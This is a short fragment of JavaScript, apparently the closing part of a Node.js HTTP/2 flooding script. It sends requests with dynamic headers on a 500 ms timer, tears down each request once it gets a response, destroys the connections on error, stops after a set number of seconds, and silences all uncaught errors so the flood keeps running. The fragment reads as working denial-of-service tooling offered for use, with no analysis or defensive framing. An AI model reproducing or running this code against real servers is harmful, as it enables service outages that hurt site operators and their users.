      ...dynHeaders,
    }, {
      parent:0,
      exclusive: true,
      weight: 241,
    })
               .on('response', response => {
                   request.close();
                   request.destroy();
                  return
               });
               request.end();
           }
       }, 500);
    });
    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return
  });

  client.on("error", error => {
client.destroy();
connection.destroy();
return
});
});
}
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
